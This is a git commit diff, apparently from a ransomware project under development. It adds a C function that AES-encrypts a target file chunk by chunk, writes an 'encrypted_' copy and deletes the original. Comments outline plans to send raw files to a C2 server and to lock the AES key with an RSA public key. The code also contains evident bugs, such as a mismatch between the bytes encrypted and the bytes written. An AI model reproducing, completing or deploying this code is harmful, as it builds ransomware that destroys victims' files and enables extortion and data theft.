09ebc06e5b301444319b12ce7b1c268c5d8253b1
cha <cha@cha.com>
2023-10-27 01:13:10 +0200

    Basic encryption feature done

--- main.c
+++ main.c
@@ -6,7 +6,7 @@
 #include "aes.h"
 
 
-void encrypt_file(struct AES_ctx ctx, uint8_t iv[16], uint8_t key[32], char file_path[256]);
+void encrypt_file(struct AES_ctx ctx, char file_path[256]);
 void generate_random_key(uint8_t *key, size_t key_length);
 void generate_random_iv(uint8_t *iv, size_t iv_length);
 
@@ -29,12 +29,7 @@ int main() {
     //Send the raw files to C2
 
     //Encrypt each file with AES
-    encrypt_file(ctx, iv, key, "a.txt");
-
-
-
-
-    //Delete raw files
+    encrypt_file(ctx, "");
 
     //Encrypt the AES key with the RSA public key
 
@@ -46,32 +41,51 @@ int main() {
     return 0;
 }
 
-void encrypt_file(struct AES_ctx ctx, uint8_t iv[16], uint8_t key[32], char file_path[256]){
+void encrypt_file(struct AES_ctx ctx, char file_path[256]){
+    //@file_path accepts both absolute and relative path
 
+    //Open raw file
     FILE *src_fp;
     src_fp = fopen(file_path, "rb");
 
-    FILE *end_fp;
-    end_fp = fopen("b.txt", "ab");
+    //Parse file's path
+    char *file_name = strrchr(file_path, '/');
+    if (file_name == NULL) {
+        file_name = file_path;
+    } else {
+        file_name++;
+    }
 
-    const size_t buffer_size = 1024;
+    //Create new (encrypted) file
+    char end_fpth[256];
+    sprintf(end_fpth, "encrypted_%s", file_name);
+
+    FILE *end_fp;
+    end_fp = fopen(end_fpth, "ab");
+
+    //Chunk creation
+    const size_t buffer_size = 4096;
     unsigned char buffer[buffer_size];
 
+    //Read file's bytes chunk by chunk until the end
     size_t bytes_read;
     while((bytes_read = fread(buffer, 1, buffer_size, src_fp)) > 0){
+        //Encrypt current chunk
+        AES_CBC_encrypt_buffer(&ctx, buffer, sizeof(buffer));
+        //Write current encrypted chunk in the new file
         fwrite(buffer, 1, bytes_read, end_fp);
-        for(size_t j = 0; j < bytes_read; ++j){
-            printf("%02X", buffer[j]);
-        }
-        printf("\n");
+
+        //Clear buffer
+        memset(buffer, 0, buffer_size);
     }
+
+    //Remove the raw file
+    remove(file_path);
 
 
 
     fclose(src_fp);
     fclose(end_fp);
-
-    //AES_CBC_encrypt_buffer(&ctx, buffer, sizeof(buffer));
 }
 
 
